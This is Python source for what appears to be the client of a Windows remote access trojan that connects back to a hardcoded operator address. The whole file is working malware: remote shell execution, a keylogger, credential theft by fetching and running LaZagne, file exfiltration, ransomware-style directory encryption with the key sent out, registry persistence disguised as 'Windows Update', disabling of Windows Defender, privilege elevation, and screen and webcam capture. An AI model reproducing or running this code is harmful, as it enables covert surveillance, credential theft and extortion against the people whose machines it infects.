import socket
import subprocess
import os
import platform
import time
from winreg import OpenKey, SetValueEx, KEY_ALL_ACCESS, REG_SZ, HKEY_CURRENT_USER
import psutil
import pyautogui
import sys
import tempfile
import threading
import pynput
import requests
import struct
from plyer import notification
from cryptography import fernet
import json
from pynput.keyboard import Key
from selenium import webdriver
import locale
import cv2
import re
from ctypes import windll

HOST = "192.168.2.126"
PORT = 666

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    sock.connect((HOST, PORT))
except Exception as e:
    exit()


def execute_shell_command(command):
    try:
        command_exec = command[5:][:-2].strip()
        if command_exec.lower().endswith(".exe"):
            subprocess.Popen(command_exec, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE)
            send_to_server(f"{command_exec} executed with success")
        else:
            process = subprocess.Popen(command_exec, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate(timeout=int(command[-2:]))
            stdout_str = stdout.decode('utf-8', errors='ignore')
            stderr_str = stderr.decode('utf-8', errors='ignore')
            if stdout_str.strip():
                send_to_server(stdout_str.strip())
            if stderr_str.strip():
                send_to_server(stderr_str.strip())
    except subprocess.TimeoutExpired:
        send_to_server(f"Timeout of{command[-2:]} expired while executing {command[5:][:-2]}")
    except Exception as e:
        send_to_server(f"Failed to execute command: {str(e)}")



_ = 1
def keylogger(command, sock):
    global keylogger_instance
    global _

    class Keylogger:
        def __init__(self, interval):
            self.log = 'Keylogger Started'
            self.interval = interval
            self.running = True

        def add_log(self, string):
            self.log += string

        def on_press(self, key):
            try:
                if key == Key.space:
                    logged_key = '[SPACE]'
                elif key == Key.backspace:
                    logged_key = '[BACKSPACE]'
                elif key == Key.enter:
                    logged_key = '[ENTER]'
                elif key == Key.shift:
                    logged_key = '[SHIFT]'
                elif key == Key.ctrl_l or key == Key.ctrl_r:
                    logged_key = '[CTRL]'
                elif key == Key.alt_l or key == Key.alt_r:
                    logged_key = '[ALT]'
                elif key == Key.tab:
                    logged_key = '[TAB]'
                elif key == Key.esc:
                    logged_key = '[ESC]'
                elif key == Key.up:
                    logged_key = '[UP]'
                elif key == Key.down:
                    logged_key = '[DOWN]'
                elif key == Key.left:
                    logged_key = '[LEFT]'
                elif key == Key.right:
                    logged_key = '[RIGHT]'
                elif key == Key.caps_lock:
                    logged_key = '[CAPS_LOCK]'
                elif key == Key.delete:
                    logged_key = '[DELETE]'
                else:
                    logged_key = f"{key.char}"
            except AttributeError:
                logged_key = f"[{str(key)}]"

            self.add_log(logged_key)

        def send_logs(self):
            command = sock.recv(1024).decode()
            if self.running and command != 'keylogger_stop':
                send_to_server(self.log)
                self.log = ' '
                timer = threading.Timer(self.interval, self.send_logs)
                timer.start()
            else:
                keylogger_instance.stop()

        def start(self):
            self.listener = pynput.keyboard.Listener(on_press=self.on_press)
            with self.listener:
                self.send_logs()
                self.listener.join()

        def stop(self):
            self.running = False
            self.listener.stop()
            send_to_server("Keylogger Stopped")

    numbers = re.findall(r'\d+', command)
    n = [int(number) for number in numbers]
    interval = (n[0])

    if command == "keylogger_stop":
        if _ % 2 != 0:
            send_to_server("No keylogger instance running.")
            _ += 1
    elif command.startswith("keylogger"):
        try:
            keylogger_instance = Keylogger(interval)
            keylogger_instance.start()
        except (IndexError, ValueError):
            if _ % 2 != 0:
                send_to_server("Invalid interval for keylogger command.")




def download_and_extract_lazagne(url, command):
    try:
        tempdir = tempfile.gettempdir()
        os.chdir(tempdir)
        req = requests.get(url)
        filename = url.split('/')[-1]
        with open(filename, 'wb') as f:
            f.write(req.content)
        execute_lazagne(int(command.split()[1]))
    except Exception as e:
        send_to_server(f"Failed to download and extract LaZagne: {str(e)}")



def execute_lazagne(timeout):
    try:
        command = 'laZagne.exe all'
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, bufsize=1,
                                   universal_newlines=True)
        start_time = time.time()
        stdout_data = []

        while process.poll() is None:
            line = process.stdout.readline()
            if line:
                stdout_data.append(line)
            if time.time() - start_time > timeout:
                process.kill()
                partial_output = ''.join(stdout_data)
                send_to_server(
                    f"Timeout exceeded ({timeout} seconds) while executing LaZagne. Partial output:\n{partial_output}")
                return

        stdout, stderr = process.communicate()
        stdout_data.extend(stdout.splitlines(True))

        if process.returncode != 0:
            error_message = stderr if stderr else ''.join(stdout_data)
            send_to_server(f"LaZagne execution failed: {error_message}")
        else:
            result = ''.join(stdout_data)
            os.remove('laZagne.exe')
            send_to_server(result)
    except subprocess.CalledProcessError as e:
        send_to_server(f"LaZagne execution blocked by antivirus: {str(e)}")
    except Exception as e:
        send_to_server(f"Failed to execute LaZagne: {str(e)}")



def send_to_server(message):
    try:
        message = ">>> " + message
        encoded_message = message.encode()
        message_length = len(encoded_message)
        sock.send(struct.pack('>I', message_length))
        sock.send(encoded_message)
    except Exception as e:
        return



def change_directory(command):
    try:
        directory = command[3:].strip()
        os.chdir(directory)
        response = f"Directory changed to: {os.getcwd()}"
        send_to_server(response)
    except FileNotFoundError as e:
        send_to_server(f"Directory not found. {str(e)}")
    except Exception as e:
        send_to_server(f"Failed to change directory: {str(e)}")



def list_directory():
    try:
        files = os.listdir()
        file_list = "\n".join(files)
        send_to_server(file_list)
    except Exception as e:
        send_to_server(f"Failed to list directory: {str(e)}")



def capture_screenshot(sock):
    try:
        screenshot = pyautogui.screenshot()
        screenshot_path = "screenshot.png"
        screenshot.save(screenshot_path)
        send_to_server("Screenshot captured successfully")
        send_image_to_server(sock, screenshot_path)
    except Exception as e:
        send_to_server(f"Failed to capture and send screenshot: {str(e)}")



def upload(command):
    filename = command[9:]
    try:
        if os.path.exists(filename):
            file_size = os.path.getsize(filename)
            with open(filename, 'rb') as f:
                data = f.read(10000)
            sock.send(data)
            send_to_server(f"File ({filename} / {file_size} bytes) uploaded successfully.")
        else:
            send_to_server(f"File {filename} not found.")
    except Exception as e:
        send_to_server(f"Failed to upload file {filename}: {str(e)}")



def encrypt_directory():
    try:
        listagem = os.listdir()
        arquivosfoco = []

        for f in listagem:
            if f == "crip.py" or f == 'chave.key' or f == 'decry.py':
                continue
            if os.path.isfile(f):
                arquivosfoco.append(f)

        chave = fernet.Fernet.generate_key()

        with open("chave.key", "wb") as arquivokey:
            arquivokey.write(chave)

        for f in arquivosfoco:
            with open(f, "rb") as alvo:
                conteudo = alvo.read()
                conteudocryp = fernet.Fernet(chave).encrypt(conteudo)
            with open(f, "wb") as alvo:
                alvo.write(conteudocryp)

        with open("chave.key", "rb") as key:
            chave = key.read()
            key_length = len(chave)
            sock.send(struct.pack('>I', key_length))
            sock.send(chave)

        os.remove("chave.key")
    except Exception as e:
        send_to_server(f"Failed to encrypt directory: {str(e)}")



def decrypt_directory(key):
    try:
        listagem = os.listdir()
        arquivosfoco = []

        for f in listagem:
            if f == "crip.py" or f == 'chave.key' or f == 'decry.py':
                continue
            if os.path.isfile(f):
                arquivosfoco.append(f)

        for f in arquivosfoco:
            with open(f, "rb") as file:
                ctt = file.read()
                cttcrip = fernet.Fernet(key).decrypt(ctt)
            with open(f, "wb") as file:
                file.write(cttcrip)
        send_to_server("Directory decrypted successfully.")
    except Exception as e:
        send_to_server(f"Failed to decrypt directory: {str(e)}")



def persist_backdoor():
    try:
        backdoor_path = os.path.abspath(sys.argv[0])
        key = HKEY_CURRENT_USER
        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        open_key = OpenKey(key, key_value, 0, KEY_ALL_ACCESS)
        SetValueEx(open_key, "Windows Update", 0, REG_SZ, backdoor_path)
        send_to_server("Backdoor persisted successfully.")
    except Exception as e:
        send_to_server(f"Failed to persist backdoor: {str(e)}")



def download(command, sock):
    data = b''
    parts = command.split(' ', 2)
    cmd, filename = parts
    print(cmd + " e " + filename)
    try:
        with open(filename, "wb") as file:
            data = sock.recv(1000000)
            if not data:
                send_to_server("Error receiving file data.")
                return
            file.write(data)
        send_to_server(f"File {filename} received successfully.")
    except Exception as e:
        send_to_server(f"Failed to download file {filename}: {str(e)}")



def web_open(command):
    try:
        url = command[8:].strip()
        driver = webdriver.Firefox()
        driver.get(url)
        pyautogui.sleep(5)
        send_to_server(f"Website {url} opened successfully on the client's PC.")
    except Exception as e:
        send_to_server(f"Failed to open website: {str(e)}")



def pop_up(command):
    try:
        msg = "msg * " + command[7:].strip()
        subprocess.Popen(msg, shell=True, stderr=subprocess.DEVNULL)
        notification.notify(
            title="⚠",
            message=command[7:].strip(),
            timeout=10
        )
        send_to_server("Message received with success")
    except subprocess.CalledProcessError as e:
        send_to_server(f"Failed to show pop-up: {e}")



def auto_remove(path):
    try:
        with open(path, 'wb') as f:
            f.seek(0)
            f.write(b'0' * os.path.getsize(path))
        os.remove(path)
        send_to_server(f"File {path} deleted with success")
    except Exception as e:
        send_to_server(f"Failed to delete file {f}: {str(e)}")



def get_system_info():
    try:
        info = {}

        platform_info = {
            'hostname': platform.node(),
            'os': platform.system(),
            'os_release': platform.release(),
            'os_version': platform.version(),
            'machine': platform.machine(),
            'os_build_type': platform.architecture()[0],
            'system_boot_time': psutil.boot_time(),
            'system_manufacturer': platform.system(),
            'processor': platform.processor(),
        }
        info['platform'] = platform_info

        cpu_info = {
            'cpu_percent': psutil.cpu_percent(),
            'cpu_count': psutil.cpu_count(),
            'cpu_freq': psutil.cpu_freq(),
            'cpu_times': psutil.cpu_times(),
        }
        info['cpu'] = cpu_info

        virtual_memory = psutil.virtual_memory()
        memory_info = {
            'total': virtual_memory.total,
            'available': virtual_memory.available,
            'used': virtual_memory.used,
            'free': virtual_memory.free,
        }

        optional_attrs = ['active', 'inactive', 'buffers', 'cached', 'shared',
                          'slab', 'total', 'available', 'used', 'free']
        for attr in optional_attrs:
            if hasattr(virtual_memory, attr):
                memory_info[attr] = getattr(virtual_memory, attr)

        info['memory'] = memory_info

        disk_info = {
            'total': psutil.disk_usage('/').total,
            'used': psutil.disk_usage('/').used,
            'free': psutil.disk_usage('/').free,
            'percent': psutil.disk_usage('/').percent,
        }
        info['disk'] = disk_info

        network_info = {
            'bytes_sent': psutil.net_io_counters().bytes_sent,
            'bytes_recv': psutil.net_io_counters().bytes_recv,
            'packets_sent': psutil.net_io_counters().packets_sent,
            'packets_recv': psutil.net_io_counters().packets_recv,
            'errin': psutil.net_io_counters().errin,
            'errout': psutil.net_io_counters().errout,
            'dropin': psutil.net_io_counters().dropin,
            'dropout': psutil.net_io_counters().dropout,
        }
        info['network'] = network_info

        locale_info = {
            'preferred_encoding': locale.getpreferredencoding(),
            'timezones': time.tzname,
        }
        info['locale'] = locale_info

        return json.dumps(info, indent=4)

    except Exception as e:
        send_to_server(f"Failed to retrieve system information: {str(e)}")



def disable_defender():
    try:
        commands = [
            "Set-MpPreference -DisableRealtimeMonitoring $true",
            "Set-MpPreference -DisableBehaviorMonitoring $true",
            "Set-MpPreference -DisableBlockAtFirstSeen $true",
            "Set-MpPreference -DisableIOAVProtection $true",
            "Set-MpPreference -DisablePrivacyMode $true",
            "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true",
            "Set-MpPreference -DisableArchiveScanning $true",
            "Set-MpPreference -DisableIntrusionPreventionSystem $true",
            "Set-MpPreference -DisableScriptScanning $true",
            "Set-MpPreference -SubmitSamplesConsent 2",
            "sc stop WinDefend",
            "sc config WinDefend start= disabled"
        ]

        for cmd in commands:
            subprocess.run(["powershell", "-Command", cmd], capture_output=True)
        send_to_server("Defender disabled successfully")

    except Exception as e:
        send_to_server(
            f"Failed in the try of disable defender: {e} / Have you permission? / Maybe the AV has detected you")



def is_admin():
    try:
        return windll.shell32.IsUserAnAdmin()
    except:
        return False



def ask_permission():
    if not is_admin():
        windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        send_to_server("Now, you're admin!")
    else:
        send_to_server("You already are admin.")



def send_image_to_server(sock, filename):
    try:
        img = cv2.imread(filename)

        encode_param = [int(cv2.IMWRITE_PNG_COMPRESSION), 9]
        _, img_encoded = cv2.imencode('.png', img, encode_param)
        data = img_encoded.tobytes()

        sock.sendall(struct.pack('>I', len(data)))

        sock.sendall(data)

        os.remove(filename)

    except Exception as e:
        send_to_server(f"Failed to send image: {e}")



def grab_cam(sock):
    try:

        cap = cv2.VideoCapture(0)

        if not cap.isOpened():
            send_to_server("Failed to open webcam")
            return

        ret, frame = cap.read()

        if not ret:
            send_to_server("Failed to capture image")
            cap.release()
            return

        cv2.imwrite("screenshot.png", frame)

        send_to_server("Image from webcam captured successfully")

        send_image_to_server(sock, "screenshot.png")

        cap.release()
    except Exception as e:
        send_to_server(f"Failed to grab webcam: {e}")




def get_help_message():
    try:
        help_message = """
            Available Commands:
            - exit: Close the connection with the server.
            - cd <directory>: Change current directory.
            - dir: List files in current directory.
            - exec <command> <timeout>: Execute a shell command on the server.
            - screenshot: Capture and send a screenshot from the server.
            - get_system_info: Retrieve system information from the victim's machine.
            - upload <filename>: Upload a file from the server to the victim's machine.
            - download <filename>: Download a file from the victim's machine to the server.
            - web-open <url>: Open anyone site on the victim's machine.
            - pop-up <msg>: Open a pop-up on the victim's machine.
            - persist: Persist the backdoor on the victim's machine.
            - lazagne <timeout>: Execute LaZagne and send full output.
            - crypter: Encrypt the directory current.
            - decrypter : Decrypt the directory current.
            - auto_remove : Delete the client in victim's machine.
            - keylogger <interval> : Capture in real time the keys pressed from victim's. machine
            - ask_permission: Ask for permission of Administration in victim's machine.
            - disable_defender: Disable the windows defender(Need to permission).
            - grab_cam: Capture a screenshot from webcam victim's machine.
            - help: Display this help message.
            """
        return help_message
    except Exception as e:
        send_to_server(f"Failed to retrieve help message: {str(e)}")



def handle_command(command):
    if command.startswith("exec"):
        execute_shell_command(command)
    elif command.startswith("cd"):
        change_directory(command)
    elif command.startswith("dir"):
        list_directory()
    elif command.startswith("screenshot"):
        capture_screenshot(sock)
    elif command.startswith("upload"):
        download(command, sock)
    elif command.startswith("persist"):
        persist_backdoor()
    elif command.startswith("get_system_info"):
        send_to_server(get_system_info())
    elif command.startswith("lazagne"):
        download_and_extract_lazagne("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe",
                                     command)
    elif command.startswith("download"):
        upload(command)
    elif command.startswith("help"):
        send_to_server(get_help_message())
    elif command.startswith("pop-up"):
        pop_up(command)
    elif command.startswith("web-open"):
        web_open(command)
    elif command.lower() == "crypter":
        encrypt_directory()
    elif command[:9] == "decrypter":
        decrypt_directory(command[9:])
    elif command.lower() == "auto_remove":
        auto_remove(os.path.basename(__file__))
    elif command.startswith("keylogger"):
        keylogger(command, sock)
    elif command.lower() == "ask_permission":
        ask_permission()
    elif command.lower() == "disable_defender":
        disable_defender()
    elif command.lower() == "grab_cam":
        grab_cam(sock)
    elif command.lower() == "exit":
        send_to_server("Connection closed")
        sock.close()



def main():
    try:
        while True:
            command = sock.recv(1024).decode()
            handle_command(command)
    except Exception as e:
        send_to_server(f"Error: {str(e)}")
        main()



if __name__ == "__main__":
    main()
